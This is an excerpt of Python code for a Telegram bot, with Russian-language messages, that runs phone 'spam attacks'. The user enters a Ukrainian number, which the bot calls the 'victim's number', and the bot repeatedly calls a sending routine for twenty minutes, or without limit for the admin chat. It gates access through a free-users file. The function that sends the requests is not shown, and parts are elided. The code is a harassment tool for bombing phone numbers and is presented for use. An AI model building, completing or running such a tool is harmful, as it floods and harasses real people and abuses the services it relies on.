...
async def start_spam_vip(phone_number, force):
	chat_id = int(message.chat.id)
	running_spams_per_chat_id.append(chat_id)
	await bot.send_message(chat_id, f'‍📱 Номер жертвы: <code>+{phone_number}</code>\n⏱ Продолжительность: <code>20 минут</code>\n💥 Атака запущена!', parse_mode='HTML')
	end = datetime.now() + timedelta(minutes=20)
	while (datetime.now() < end) or (force and chat_id == ADMIN_CHAT_ID):
		if chat_id not in running_spams_per_chat_id:
			break
		sendUA(phone_number)
	await bot.send_message(chat_id, f'<b>Спам на номер {phone_number} завершён</b>', parse_mode='HTML')
	THREADS_AMOUNT[0] -= 1
	try:
...
async def spam_handler_vip(phone, force):
	chat_id = int(message.chat.id)
	if int(chat_id) in running_spams_per_chat_id:
		await bot.send_message(chat_id, '🛑 Вы уже начали рассылку спама. Дождитесь окончания или нажмите "Остановить атаку ❌" и попробуйте снова')
		return
...
async def start_spam(message):
	...
	if len(message.text) == 12 and message.text.startswith('380'):
		...
		if str(chat_id) in open('users_free.txt').read():
			await bot.send_message(chat_id, 'Запуск сессии - ✅')
			await spam_handler_vip(phone_number, force=False)
